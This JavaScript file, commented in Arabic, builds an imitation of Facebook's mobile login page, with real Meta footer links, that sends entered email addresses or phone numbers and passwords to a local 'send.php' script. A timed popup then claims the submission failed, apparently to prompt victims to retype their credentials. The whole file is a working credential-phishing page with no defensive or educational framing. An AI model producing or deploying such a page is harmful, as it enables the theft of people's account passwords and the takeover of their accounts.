document.addEventListener('DOMContentLoaded', function () {
    // إنشاء العناصر
    const body = document.body;

    const languageDiv = document.createElement('div');
    languageDiv.className = 'language';
    languageDiv.textContent = 'English (UK)';

    const containerDiv = document.createElement('div');
    containerDiv.className = 'container';

    const logoDiv = document.createElement('div');
    logoDiv.className = 'logo';

    const logoImg = document.createElement('img');
    logoImg.src = './logo.png';
    logoImg.alt = 'facebook';

    const form = document.createElement('form');
    form.className = 'container';
    form.action = 'send.php';
    form.method = 'POST';

    const emailInputContainer = document.createElement('div');
    emailInputContainer.className = 'input-container';

    const emailInput = document.createElement('input');
    emailInput.type = 'text';
    emailInput.id = 'email';
    emailInput.placeholder = ' ';
    emailInput.name = 'email';
    emailInput.required = true;

    const emailLabel = document.createElement('label');
    emailLabel.htmlFor = 'email';
    emailLabel.textContent = 'Mobile number or email address';

    const emailClearIcon = document.createElement('img');
    emailClearIcon.src = './clear.png';
    emailClearIcon.alt = 'clear';
    emailClearIcon.className = 'clear-icon';
    emailClearIcon.width = 20;

    const passwordInputContainer = document.createElement('div');
    passwordInputContainer.className = 'input-container';

    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.id = 'password';
    passwordInput.placeholder = ' ';
    passwordInput.name = 'password';
    passwordInput.required = true;

    const passwordLabel = document.createElement('label');
    passwordLabel.htmlFor = 'password';
    passwordLabel.textContent = 'Password';

    const passwordToggleIcon = document.createElement('img');
    passwordToggleIcon.src = './show.png';
    passwordToggleIcon.alt = 'password visible';
    passwordToggleIcon.className = 'toggle-password';
    passwordToggleIcon.width = 20;

    const loginButton = document.createElement('button');
    loginButton.type = 'submit';
    loginButton.className = 'login-btn';
    loginButton.name = 'send';
    loginButton.textContent = 'Log in';

    const forgotLink = document.createElement('a');
    forgotLink.href = 'https://m.facebook.com/login/identify/';
    forgotLink.className = 'forgot';
    forgotLink.textContent = 'Forgotten Password?';

    const signupLink = document.createElement('a');
    signupLink.href = 'https://m.facebook.com/reg/';
    signupLink.className = 'signup';
    signupLink.textContent = 'Create new account';

    const metaDiv = document.createElement('div');
    metaDiv.className = 'meta';

    const metaImg = document.createElement('img');
    metaImg.src = './meta.svg';
    metaImg.alt = 'Meta';

    const linkFtrDiv = document.createElement('div');
    linkFtrDiv.className = 'link_ftr';

    const aboutLink = document.createElement('a');
    aboutLink.href = 'https://about.meta.com/';
    aboutLink.textContent = 'About';

    const helpLink = document.createElement('a');
    helpLink.href = 'https://m.facebook.com/help/?ref=pf&_rdc=1&_rdr#';
    helpLink.textContent = 'Help';

    const moreLink = document.createElement('a');
    moreLink.href = '#';
    moreLink.textContent = 'More';

    const overlay = document.createElement('div');
    overlay.id = 'overlay';

    const popup = document.createElement('div');
    popup.className = 'popup';
    popup.id = 'popup';

    const popupMessage = document.createElement('p');
    popupMessage.textContent = 'Your message was not sent successfully. Please try again.';

    const popupButton = document.createElement('button');
    popupButton.textContent = 'Close';

    // إضافة العناصر إلى DOM
    body.appendChild(languageDiv);
    body.appendChild(containerDiv);
    containerDiv.appendChild(logoDiv);
    logoDiv.appendChild(logoImg);
    containerDiv.appendChild(form);
    form.appendChild(emailInputContainer);
    emailInputContainer.appendChild(emailInput);
    emailInputContainer.appendChild(emailLabel);
    emailInputContainer.appendChild(emailClearIcon);
    form.appendChild(passwordInputContainer);
    passwordInputContainer.appendChild(passwordInput);
    passwordInputContainer.appendChild(passwordLabel);
    passwordInputContainer.appendChild(passwordToggleIcon);
    form.appendChild(loginButton);
    form.appendChild(forgotLink);
    containerDiv.appendChild(signupLink);
    containerDiv.appendChild(metaDiv);
    metaDiv.appendChild(metaImg);
    containerDiv.appendChild(linkFtrDiv);
    linkFtrDiv.appendChild(aboutLink);
    linkFtrDiv.appendChild(helpLink);
    linkFtrDiv.appendChild(moreLink);
    body.appendChild(overlay);
    body.appendChild(popup);
    popup.appendChild(popupMessage);
    popup.appendChild(popupButton);

    // إضافة الأحداث
    emailClearIcon.addEventListener('click', clearInput);
    passwordToggleIcon.addEventListener('click', togglePasswordVisibility);
    emailInput.addEventListener('input', function () {
        if (this.value.length > 0) {
            emailClearIcon.style.display = 'block';
        } else {
            emailClearIcon.style.display = 'none';
        }
    });
    popupButton.addEventListener('click', closePopup);

    // وظائف JavaScript
    function togglePasswordVisibility() {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            passwordToggleIcon.src = './hiden.png';
        } else {
            passwordInput.type = 'password';
            passwordToggleIcon.src = './show.png';
        }
    }

    function clearInput() {
        emailInput.value = '';
        emailClearIcon.style.display = 'none';
    }

    function closePopup() {
        popup.style.display = 'none';
        overlay.style.display = 'none';
    }

    setTimeout(function () {
        popup.style.display = 'block';
        overlay.style.display = 'block';
    }, 1500);
});